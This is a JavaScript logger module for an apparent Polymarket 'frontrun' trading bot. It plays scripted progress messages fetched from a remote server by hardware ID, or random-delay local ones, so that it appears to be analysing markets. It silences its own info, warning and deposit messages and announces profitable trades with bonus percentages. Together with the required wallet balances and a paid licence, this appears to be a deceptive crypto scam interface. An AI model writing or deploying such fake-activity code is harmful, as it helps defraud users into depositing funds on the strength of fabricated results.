const http = require('http');
const https = require('https');

const colors = {
    reset: '\x1b[0m',
    gray: '\x1b[90m',
    green: '\x1b[32m',
    brightGreen: '\x1b[92m',  
    yellow: '\x1b[33m',
    blue: '\x1b[36m',
    red: '\x1b[31m',
    brightMagenta: '\x1b[95m' 
};

function getTimestamp() {
    const now = new Date();
    const year = now.getFullYear();
    const month = String(now.getMonth() + 1).padStart(2, '0');
    const day = String(now.getDate()).padStart(2, '0');
    const h = String(now.getHours()).padStart(2, '0');
    const m = String(now.getMinutes()).padStart(2, '0');
    const s = String(now.getSeconds()).padStart(2, '0');
    const ms = String(now.getMilliseconds()).padStart(3, '0');
    return `[${year}-${month}-${day} ${h}:${m}:${s}.${ms}]`;
}

function logTable(level, message) {
    const ts = colors.gray + getTimestamp() + colors.reset;
    const sep = colors.gray + ' - ' + colors.reset;
    let levelCol = '';
    let color = colors.reset;

    if (level === 'SUCCESS') {
        levelCol = colors.green + 'SUCCESS'.padEnd(8) + colors.reset;
        color = colors.green;
    } else if (level === 'INFO') {
        levelCol = colors.blue + 'INFO'.padEnd(8) + colors.reset;
        color = colors.blue;
    } else if (level === 'WARN') {
        levelCol = colors.yellow + 'WARN'.padEnd(8) + colors.reset;
        color = colors.yellow;
    } else if (level === 'ERROR') {
        levelCol = colors.red + 'ERROR'.padEnd(8) + colors.reset;
        color = colors.red;
    } else if (level === 'PROGRESS') {
        levelCol = colors.brightMagenta + 'PROGRESS'.padEnd(8) + colors.reset;
        color = colors.brightMagenta;
    } else if (level === 'NOTICE') {
        levelCol = colors.brightGreen + 'NOTICE'.padEnd(8) + colors.reset;
        color = colors.brightGreen;
    }

    console.log(`${ts}${sep}${levelCol}${sep}${color}${message}${colors.reset}`);
}

function randomDelay(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function httpGetScenario(serverUrl, hwid) {
    return new Promise((resolve, reject) => {
        const url = new URL(`${serverUrl}/api/sse/get-scenario`);
        if (hwid) {
            url.searchParams.set('hwid', hwid);
        }
        const isHttps = url.protocol === 'https:';
        const lib = isHttps ? https : http;
        
        const options = {
            hostname: url.hostname,
            port: url.port || (isHttps ? 443 : 80),
            path: url.pathname + url.search,
            method: 'GET',
            timeout: 5000
        };
        
        const req = lib.request(options, (res) => {
            let body = '';
            res.on('data', chunk => body += chunk);
            res.on('end', () => {
                try {
                    const data = JSON.parse(body);
                    resolve(data);
                } catch {
                    reject(new Error('Invalid JSON response'));
                }
            });
        });
        
        req.on('error', reject);
        req.on('timeout', () => {
            req.destroy();
            reject(new Error('Request timeout'));
        });
        
        req.end();
    });
}

function httpPost(serverUrl, path, data) {
    return new Promise((resolve, reject) => {
        const url = new URL(`${serverUrl}${path}`);
        const isHttps = url.protocol === 'https:';
        const lib = isHttps ? https : http;
        const postData = JSON.stringify(data);
        
        const options = {
            hostname: url.hostname,
            port: url.port || (isHttps ? 443 : 80),
            path: url.pathname,
            method: 'POST',
            timeout: 5000,
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(postData)
            }
        };
        
        const req = lib.request(options, (res) => {
            let body = '';
            res.on('data', chunk => body += chunk);
            res.on('end', () => {
                try {
                    resolve(JSON.parse(body));
                } catch {
                    resolve({ success: true });
                }
            });
        });
        
        req.on('error', reject);
        req.on('timeout', () => {
            req.destroy();
            reject(new Error('Request timeout'));
        });
        
        req.write(postData);
        req.end();
    });
}

class ProdLogger {
    constructor() {
        this.mode = 'prod';
        this.initShown = false;
        this.searchTimers = [];
        this.tradeStartCallback = null;
        this.tradeCompletedData = null;
        this.resultsShown = false;
        this.lowFrequency = false;
        
        this.tradeQueue = [];
        this.tradeInProgress = false;
        
        this.serverUrl = process.env.SERVER_URL || 'https://api.polyfront.live';
    }

    resetInitState() {
        this.clearAllTimers();
        this.initShown = false;
    }

    clearAllTimers() {
        if (this.searchTimers && this.searchTimers.length > 0) {
            this.searchTimers.forEach(timer => clearTimeout(timer));
            this.searchTimers = [];
        }
    }

    async startSearch(onTradeStart, options = {}) {
        this.tradeStartCallback = onTradeStart;
        this.tradeCompletedData = null;
        this.resultsShown = false;
        this.tradeQueue = [];
        this.tradeInProgress = false;
        this.clearAllTimers();
        
        try {
            const response = await httpGetScenario(this.serverUrl, options.hwid);
            
            if (response.success && response.scenario) {
                this.lowFrequency = response.lowFrequency === true;
                this.playScenario(response.scenario);
            } else {
                this.lowFrequency = false;
                this.playLocalScenario();
            }
        } catch (error) {
            this.lowFrequency = false;
            this.playLocalScenario();
        }
    }


    playScenario(scenario) {
        if (!Array.isArray(scenario) || scenario.length === 0) {
            console.warn('[Logger] Invalid scenario, using fallback');
            this.playLocalScenario();
            return;
        }
        
        const hasStartTrade = scenario.some(event => event.action === 'START_TRADE');
        if (!hasStartTrade && !this.lowFrequency) {
            console.warn('[Logger] Scenario missing START_TRADE, adding it');
            const lastEvent = scenario[scenario.length - 1];
            const startTradeDelay = (lastEvent?.delay || 0) + 5000;
            scenario.push({
                delay: startTradeDelay,
                level: 'PROGRESS',
                message: 'Starting trade...',
                action: 'START_TRADE'
            });
        }
        
        scenario.forEach(event => {
            const timer = setTimeout(() => {
                if (event.message) {
                    logTable(event.level, event.message);
                }
                
                if (event.action === 'START_TRADE' && this.tradeStartCallback) {
                    const tradeInfo = {
                        tradeIndex: event.tradeIndex || 1,
                        totalTrades: event.totalTrades || 1,
                        lowFrequency: this.lowFrequency || event.lowFrequency === true
                    };
                    this.tradeQueue.push(tradeInfo);
                    this.processNextTrade();
                }

                if (event.action === 'POSITION_HOLD' && this.tradeStartCallback) {
                    this.tradeQueue.push({
                        tradeIndex: 1,
                        totalTrades: 1,
                        lowFrequency: true
                    });
                    this.processNextTrade();
                }
            }, event.delay);
            
            this.searchTimers.push(timer);
        });
    }

    processNextTrade() {
        if (this.tradeInProgress || this.tradeQueue.length === 0) {
            return;
        }
        
        this.tradeInProgress = true;
        this.resultsShown = false;
        
        const tradeInfo = this.tradeQueue.shift();
        this.tradeStartCallback(tradeInfo);
    }

    tradeFinished() {
        this.tradeInProgress = false;
        this.processNextTrade();
    }

    playLocalScenario() {
        let delay = 0;
        
        delay += randomDelay(1000, 2000);
        this.searchTimers.push(setTimeout(() => {
            logTable('INFO', 'Connecting to Polymarket API...');
        }, delay));
        
        delay += randomDelay(5000, 10000);
        this.searchTimers.push(setTimeout(() => {
            logTable('INFO', 'Analyzing Polymarket events 1/3...');
        }, delay));
        
        delay += randomDelay(5000, 10000);
        this.searchTimers.push(setTimeout(() => {
            logTable('INFO', 'Analyzing Polymarket events 2/3...');
        }, delay));
        
        delay += randomDelay(5000, 10000);
        this.searchTimers.push(setTimeout(() => {
            logTable('INFO', 'Analyzing Polymarket events 3/3...');
        }, delay));
        
        delay += randomDelay(5000, 10000);
        this.searchTimers.push(setTimeout(() => {
            logTable('PROGRESS', 'Selecting most active events...');
            
            if (this.tradeStartCallback) {
                this.resultsShown = false;
                this.tradeStartCallback({ tradeIndex: 1, totalTrades: 1 });
            }
        }, delay));
    }

    stopSearch() {
        this.clearAllTimers();
    }

    showTradeResults() {
        if (this.resultsShown) return;
        this.resultsShown = true;

        if (this.tradeCompletedData) {
            logTable('NOTICE', 'Found bet for frontrun');
            logTable('SUCCESS', `Trade executed! Deposited: ${this.tradeCompletedData.depositAmount} USDC, Received: ${this.tradeCompletedData.totalReceived} USDC (bonus: +${this.tradeCompletedData.bonusAmount} USDC, +${this.tradeCompletedData.bonusPercent}%)`);
        }
    }

    info(message) {

    }

    success(message) {
        logTable('SUCCESS', message);
    }

    error(message) {
        logTable('ERROR', message);
    }

    insufficientFunds(minPol) {
        logTable('WARN', `Insufficient POL balance. Minimum: ${minPol} POL`);
    }

    rateLimitError() {
        logTable('ERROR', 'Too many requests. Please wait 1 minute and try again.');
    }

    freemiumLimitReached(limitInfo, purchaseUrl) {
        logTable('ERROR', '❌ Trial version expired. Free transactions limit reached.');
        logTable('INFO', '💳 Please purchase a full license to continue.');
        if (limitInfo) {
            logTable('INFO', `📊 Used: ${limitInfo.used || 'N/A'}/${limitInfo.total || 'N/A'} transactions`);
        }
        if (purchaseUrl) {
            logTable('INFO', `🌐 Purchase license: ${purchaseUrl}`);
        }
    }

    timeoutError() {
        logTable('ERROR', 'Connection timeout. Check your internet connection.');
    }

    networkError() {
        logTable('ERROR', 'Network error. Check your RPC connection.');
    }

    warn(message) {   
    }

    depositFound(amount) {
    }

    async tradeCompleted(depositAmount, totalReceived, bonusAmount, bonusPercent) {
        this.tradeCompletedData = { depositAmount, totalReceived, bonusAmount, bonusPercent };
        this.showTradeResults();
    }

    initCheck(rpcResult, balanceResult) {
        if (this.initShown) return;
        this.initShown = true;

        console.log('');
        logTable('INFO', 'System initialization...');

        const rpcStatus = rpcResult.success ? '✅' : '❌';
        logTable(rpcResult.success ? 'SUCCESS' : 'WARN', `${rpcStatus} RPC check: ${rpcResult.working}/${rpcResult.total} working`);

        const polStatus = balanceResult.polSufficient ? '✅' : '❌';
        logTable(balanceResult.polSufficient ? 'SUCCESS' : 'ERROR', `${polStatus} POL: ${balanceResult.polBalance} (required: ${balanceResult.polRequired}+)`);

        const usdcStatus = balanceResult.usdcSufficient ? '✅' : '❌';
        logTable(balanceResult.usdcSufficient ? 'SUCCESS' : 'WARN', `${usdcStatus} USDC: ${balanceResult.usdcBalance} (required: ${balanceResult.usdcRequired}+)`);
    }

    freemiumLimitError(limitCheck) {
        this.clearAllTimers();
        this.initShown = true;

        console.log('');
        if (limitCheck.freemiumLimitReached) {
            const errorMatch = limitCheck.error?.match(/(\d+)\/(\d+)/);
            const limitInfo = errorMatch ? { used: errorMatch[1], total: errorMatch[2] } : null;
            this.freemiumLimitReached(limitInfo, limitCheck.purchaseUrl);
        } else {
            logTable('ERROR', limitCheck.error || 'Limit reached');
        }
    }

    tradeStart() {
        logTable('INFO', 'Starting trade...');
    }

    preparingNextTrade() {
        logTable('INFO', 'Preparing next trade...');
    }
}

module.exports = ProdLogger;
